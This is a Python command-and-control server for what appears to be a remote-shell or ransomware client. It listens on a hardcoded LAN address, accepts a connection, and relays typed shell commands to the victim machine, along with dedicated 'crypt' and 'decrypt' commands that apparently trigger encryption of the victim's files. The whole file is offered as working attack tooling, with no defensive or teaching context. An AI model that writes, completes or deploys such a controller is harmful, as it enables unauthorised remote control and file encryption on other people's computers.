#!/usr/bin/python3
import sys
import socket

# Sending commands to the client
def send_commands():
    global conn
    while True:
        cmd = input(">>> ")
        if cmd == 'quit':
            conn.close()
            sock.close()
            sys.exit()
        if cmd == 'crypt':
            conn.send(cmd.encode('utf-8'))
        if cmd == 'decrypt':
            conn.send(cmd.encode('utf-8'))
        else:
            conn.send(cmd.encode('utf-8'))
            data = conn.recv(1024)
            print(data.decode('utf-8'))
        

# Getting connected
def accepting():
    global conn
    conn,addr = sock.accept()
    print('Connecting to %s' % addr[0])
    send_commands()
    sock.close()

# Waiting for connection
def binding_server():
    global host
    global port
    global sock

    sock.bind((host,port))
    sock.listen(10)
    accepting()
# Root server
def main():
    global sock
    global port
    global host
    host = '192.168.1.6'
    port = 19876
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print('Running on %s:%d' % (host, port))
    binding_server()
main()
